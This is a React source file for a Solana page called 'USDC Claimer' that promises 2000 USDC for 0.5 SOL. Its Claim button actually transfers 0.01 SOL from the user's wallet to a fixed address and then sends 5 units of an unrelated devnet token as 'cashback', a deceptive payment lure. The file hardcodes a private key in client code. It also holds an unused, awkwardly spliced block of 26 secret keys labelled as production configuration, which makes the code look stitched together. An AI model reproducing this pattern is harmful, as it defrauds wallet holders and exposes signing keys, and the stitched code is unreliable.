/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5Lr6DNSezwLHMAKhWJTtuiXBspz9HZzjHjZFq83WjMzwyPg17RMn9y9LtCqpkV2o3yzprTLonzBpcoGhQ1WffAAd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3kGgWuTdLVeiRJ3Ts47ZCgwHxB5vvdMubnzNn4pCPWy8zwZY3tFZXjqQ1y5hrDrmDfqaMcdEj4zrbX6DPoZ4h2up",
  "key1": "3sZbzJZ75HTw9sbgJigKJyHWwVRoq4xQduppmPhymqwBfjDSpjzA6unx4sLvsMGRpMx2BCfPwqs5Gr2GtTzJa5WC",
  "key2": "61aDE2B5QN3zce9Qn2zZtMfLTPJb7MpwXEs9PEmcyNvCJxkhdidtNe6fYCEncpx3hFXJay65XfihMAN6ip1eQZHk",
  "key3": "2uSGDTF3hN29itdqzuoLnqreTT6RugQTTKs8WNVKUnc9NmMtgwKNpJoLESWQ6CfsSQ3unuraZ9fxWwRheoMe3ypa",
  "key4": "2Y5DnmMn1Cv9AP3fmTeERzS3KeZt2q4aRE7ybeoaFPz5UhPKYndJTYXtkLGgVXMqyRt8cFVgH4ENBpVoGgxWg3ic",
  "key5": "5oPndspi2qQ4iR9qk1ZaqM4BiC5Vpk2YGbtm4HXyXz4zc6gKWrZZx9GTbYHF7AQ3QGeNQkgtunyDE44robjs7T16",
  "key6": "2uknhQDSxYQkSZ26TqXstttAKxdhDsYq6ua4WsvzZJSyFSe91tkQ4PdYVRsBkA5wpoRrc6wmEyMXTMrTtcrwh8JR",
  "key7": "45zmLntq3ourkKTz9wXR4cYaRLDf2Sn2N2F6Cif6oHnZWio6nsWfjkTtPWobS4WAVCBE7uDUgWxTjHNy5pk81j6F",
  "key8": "5J5fCPQeMKdjP8h4VNGGGEMEhrhKZqNMsuvmXbTdBzzRjVCNMYqupNktSnfMm9F4JygqEhuXW1JH7Yp18k5FznT1",
  "key9": "ra1V2wc9G7dnQsfSy8fgtmMMyndViWNKKW8aDLFQ3GgmhzBL7R8m6GkfaMmBoL2L8ykXAZVeptyV9t53neYdq11",
  "key10": "3XXCJrzMeeTXCEC2xUgPyTT1p8DWbTZayXLxyVxTmC3J46EUbdw4vcxCJ7CHNmBvoG4aE9UeXLzSYXJRXfNSvoTP",
  "key11": "3fBTddk1rLXSE3LTTcyjmy7ZEmTmW7hWXpD5yr1bDe7Yeg25mQpACLzxoQFE7UGAExr9mc7gw3HqXp1mh77ipz4i",
  "key12": "2w8NHQmdBcp63iFtnH6zMheCD9KqM1JJd4G4uLM28NF4xwbGQfhMhYDumANimLJXoPPvLYnWCcMxbXuLC4YYUZw5",
  "key13": "bGp6xTSmChrPHs2Una2KKhiaJHxk6gZAyQMJ2EerTG3sbL5Z8jfdLDciMbYNkK8NexAXvzndMVeTqysz5ZxCbDi",
  "key14": "3qkwzKa31D3cTgGcyW4j87mqekDqdSdDBwtz6iGWV3pe6w6M2Cjg9gZxhUp5pV3axeWL7iBLwsbsfce6WbyPxEC1",
  "key15": "2dHjbMUeJ86ZKJC6r3JwLFUujNTbbKFKMrvueigphBVvGZRyEt3asaaiGz2YvSw82td2h61n6MwARHYgRoohAHh9",
  "key16": "5K5v5x6yDh88uvtCU2jJgMK4y1EBpvPf3AbRVz3xSiPwmiMWLztx8SSNGuMesp1k1VuPcg5UyCrp82qvbUWz8NKM",
  "key17": "4vmv7L8PqkrhAJDHj4nMmkicGmY3JSib38agUDYQcjwxNi4NaxqRQV1X7mTDiAjSKJQLYgAY4juxtt2ExUpfPcNj",
  "key18": "3dey6cSDfVPh7p4p4A1n3eHQ8VGonEyRFKBi67Fa73hRXDQoPVhpShwqMy37pVQLT44teeJZQhB6tQ5oGACLXFhG",
  "key19": "3Uua15Sc5UQop4sHzKYoZuYQox6z4JUfQkDaEd12LUATgGhbie6yBxPug9WyRnBTpKpqEpmoqbxPifp5v3oD3SoY",
  "key20": "41EuF6pcttTiGwNRnRtjG2R9M4LfcUcqynNvp3J2PkSfM3BMt7zyo5TFAoTXYNoM4dvcF8VANo6vN2bhw9hEA6U",
  "key21": "67QvL3AAVyaWepZCUoc3nH8EtuCw7ntVa4Zrncb1wtXTy7rFaVkVRYU39yvPny1Wj4sZG8nxyxFdh5LmTPEQPhd7",
  "key22": "5ZPGf7bcNREzPga6nGV8kPLpPTrnhP27gJ31zWJLSyv4r2J2Vkivwi5SSqbysz1QJQZ4stJh1rSMXC54sWVSDpxm",
  "key23": "5uHT4UF56V8UTTgowFtfdPsDB1wRYKfXEkQRysDqrvZPNBci2GwWu6AZ3XhZ2rf7nw81zGFmZwCbe1TmCpuBRRMz",
  "key24": "4oqD2rTnEitGjiNWLpXfH45CXSvpVRUH1zSEpBdqcSUrwSB7r67QUtzyquqJ4rVnotJ6gY66M3deAYRRakrGw8WE",
  "key25": "3snpW8fR4ghR3MVoJ4Q2BVqEFBeQZdesCJKdj83NcFHms39PR15xx4m6gi7SR48rCMmfLEysucnXD7yZok893c4g"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
